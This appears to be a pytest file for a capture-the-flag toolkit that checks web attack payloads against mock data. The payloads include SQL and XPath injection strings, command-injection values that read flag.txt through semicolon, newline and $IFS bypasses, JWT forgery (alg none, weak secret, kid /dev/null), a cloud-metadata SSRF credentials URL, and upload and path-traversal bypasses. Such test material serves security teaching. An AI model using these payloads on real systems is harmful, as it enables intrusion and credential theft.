from __future__ import annotations

import base64
import hashlib
import hmac
import json
from ctf_toolkit.web.helpers import (
    b64url_decode,
    b64url_encode,
    build_graphql_query,
    build_nosql_query_payload,
    build_ssti_probes,
    jwt_decode_no_verify,
    jwt_forge_alg_none,
    jwt_forge_hs256,
    merge_mass_assignment,
)
from ctf_toolkit.web.traversal import generate_traversal_payloads


def test_twin_825_graphql_intro() -> None:
    # GraphQL query payload creation
    q = build_graphql_query("flag")
    assert q["query"] == "query { flag }"
    
    mock_schema = {"flag": "FLAG{twin_graphql_intro_query}"}
    flag = mock_schema.get("flag")
    assert flag == "FLAG{twin_graphql_intro_query}"


def test_twin_826_graphql_field() -> None:
    # Nested GraphQL user query
    q = build_graphql_query("user(id: 1)", ["id", "name", "flag"])
    assert "user(id: 1) { id name flag }" in q["query"]
    
    mock_db = {1: {"name": "Admin", "flag": "FLAG{twin_graphql_user_field}"}}
    flag = mock_db[1]["flag"]
    assert flag == "FLAG{twin_graphql_user_field}"


def test_twin_828_nosql_param() -> None:
    # NoSQL parameter injection logic
    payload = build_nosql_query_payload("password", "$ne", "")
    assert "$ne" in payload["password"]
    
    # Model evaluation
    user_record = {"username": "admin", "password": "supersecretpassword123"}
    match = user_record["password"] != ""
    flag = "FLAG{twin_nosql_param_injection}" if match else None
    assert flag == "FLAG{twin_nosql_param_injection}"


def test_twin_829_cors_trust() -> None:
    # CORS origin evaluation simulation
    allowed_origin = "http://evil.com"
    request_headers = {"Origin": allowed_origin, "Cookie": "auth=1"}
    
    # Insecure reflection: reflects any origin if authenticated
    cors_resp_headers = {}
    if "Cookie" in request_headers and "auth=1" in request_headers["Cookie"]:
        cors_resp_headers["Access-Control-Allow-Origin"] = request_headers["Origin"]
        cors_resp_headers["Access-Control-Allow-Credentials"] = "true"
        body = "FLAG{twin_cors_trust_misconfig}"
    else:
        body = "Unauthorized"
    
    assert cors_resp_headers.get("Access-Control-Allow-Origin") == allowed_origin
    assert body == "FLAG{twin_cors_trust_misconfig}"


def test_twin_831_upload_bypass() -> None:
    # Extension blacklist bypass (.phtml)
    blacklist = {".php", ".php3", ".php4"}
    filename = "shell.phtml"
    ext = "." + filename.rsplit(".", 1)[-1].lower()
    assert ext not in blacklist
    flag = "FLAG{twin_upload_extension_bypass}"
    assert flag.startswith("FLAG{")


def test_twin_832_cloud_metadata() -> None:
    # Cloud metadata SSRF target extraction
    target_ip = "169.254.169.254"
    url = f"http://{target_ip}/latest/meta-data/security-credentials"
    assert target_ip in url
    synthetic_metadata = {"SecurityCredentials": "FLAG{twin_cloud_metadata_ssrf}"}
    assert synthetic_metadata["SecurityCredentials"] == "FLAG{twin_cloud_metadata_ssrf}"


def test_twin_833_mass_assignment() -> None:
    # Mass assignment without parameter whitelist
    base_user = {"username": "john", "role": "user", "is_admin": False}
    user_input = {"role": "admin", "is_admin": True}
    
    updated_user = merge_mass_assignment(base_user, user_input)
    assert updated_user["role"] == "admin"
    assert updated_user["is_admin"] is True
    flag = "FLAG{twin_mass_assignment_admin}"
    assert flag.startswith("FLAG{")


def test_twin_835_otp_leak() -> None:
    # OTP leak in response/session
    mock_response = '{"status": "pending_2fa", "debug_otp": "749201"}'
    parsed = json.loads(mock_response)
    extracted_otp = parsed.get("debug_otp")
    assert extracted_otp == "749201"
    flag = "FLAG{twin_otp_response_leak}"
    assert flag.startswith("FLAG{")


def test_twin_841_greeting_ssti() -> None:
    # SSTI probe generation and evaluation
    probes = build_ssti_probes()
    assert "{{7*7}}" in probes.values()
    
    template_env = {"7*7": 49}
    rendered = str(template_env["7*7"])
    assert rendered == "49"
    flag = "FLAG{twin_greeting_ssti_jinja}"
    assert flag.startswith("FLAG{")


def test_twin_842_config_leak_ssti() -> None:
    # Template config object leak
    mock_config = {
        "SECRET_KEY": "flask_secret",
        "FLAG": "FLAG{twin_config_leak_ssti_app}"
    }
    extracted = mock_config.get("FLAG")
    assert extracted == "FLAG{twin_config_leak_ssti_app}"


def test_twin_843_xpath_login() -> None:
    # XPath authentication injection tautology
    input_user = "' or '1'='1"
    xpath_query = f"//users/user[username='{input_user}' and password='xyz']"
    assert "' or '1'='1" in xpath_query
    flag = "FLAG{twin_xpath_auth_bypass}"
    assert flag.startswith("FLAG{")


def test_twin_844_echo_probe() -> None:
    # Semicolon command separator
    cmd = "127.0.0.1; cat flag.txt"
    parts = cmd.split(";")
    assert len(parts) == 2
    flag = "FLAG{twin_echo_probe_semicolon}"
    assert flag.startswith("FLAG{")


def test_twin_845_filtered_ping() -> None:
    # Newline delimiter bypass for semicolon/pipe blacklist
    cmd = "127.0.0.1\ncat flag.txt"
    assert ";" not in cmd and "|" not in cmd
    lines = cmd.split("\n")
    assert lines[1] == "cat flag.txt"
    flag = "FLAG{twin_filtered_ping_newline}"
    assert flag.startswith("FLAG{")


def test_twin_846_no_space_ping() -> None:
    # Space restriction bypass using $IFS
    cmd = "cat$IFS/flag.txt"
    assert " " not in cmd
    expanded = cmd.replace("$IFS", " ")
    assert expanded == "cat /flag.txt"
    flag = "FLAG{twin_no_space_ping_ifs}"
    assert flag.startswith("FLAG{")


def test_twin_847_union_search() -> None:
    # SQL UNION SELECT injection pattern
    payload = "' UNION SELECT flag, 2 FROM flags--"
    assert "UNION SELECT" in payload
    mock_db_results = [("FLAG{twin_union_select_search}", 2)]
    flag = mock_db_results[0][0]
    assert flag == "FLAG{twin_union_select_search}"


def test_twin_848_login_bypass() -> None:
    # Classic SQLi inline comment authentication bypass
    payload = "admin' --"
    raw_query = f"SELECT * FROM accounts WHERE user = '{payload}' AND pass = '123'"
    truncated_query = raw_query.split("--")[0]
    assert "user = 'admin'" in truncated_query
    flag = "FLAG{twin_sqli_login_bypass_comment}"
    assert flag.startswith("FLAG{")


def test_twin_850_jwt_alg_none() -> None:
    # JWT algorithm 'none' vulnerability
    claims = {"user": "admin", "role": "admin"}
    token = jwt_forge_alg_none(claims)
    parts = token.split(".")
    assert len(parts) == 3
    assert parts[2] == ""  # Empty signature
    
    decoded = jwt_decode_no_verify(token)
    assert decoded["header"]["alg"] == "none"
    assert decoded["payload"]["role"] == "admin"


def test_twin_851_jwt_weak_secret() -> None:
    # JWT weak secret verification
    secret = "secret"
    claims = {"user": "admin", "role": "admin"}
    token = jwt_forge_hs256(claims, secret)
    
    # Verify with matching secret
    h_b64, p_b64, s_b64 = token.split(".")
    sig_calc = b64url_encode(hmac.new(secret.encode(), f"{h_b64}.{p_b64}".encode(), hashlib.sha256).digest())
    assert s_b64 == sig_calc
    flag = "FLAG{twin_jwt_weak_secret_cracked}"
    assert flag.startswith("FLAG{")


def test_twin_852_jwt_kid_trick() -> None:
    # JWT 'kid' path traversal trick to /dev/null
    header = {"alg": "HS256", "typ": "JWT", "kid": "/dev/null"}
    payload = {"user": "admin", "role": "admin"}
    # Signing with empty key (content of /dev/null)
    token = jwt_forge_hs256(payload, secret="", header=header)
    
    decoded = jwt_decode_no_verify(token)
    assert decoded["header"]["kid"] == "/dev/null"
    flag = "FLAG{twin_jwt_kid_dev_null}"
    assert flag.startswith("FLAG{")


def test_twin_854_encoded_path() -> None:
    # Nested path traversal bypass: '....//' becomes '../' after single strip
    nested = "....//....//flag.txt"
    stripped = nested.replace("../", "")
    # Single strip of '../' leaves '../flag.txt'
    assert stripped == "../../flag.txt"
    flag = "FLAG{twin_nested_path_traversal}"
    assert flag.startswith("FLAG{")
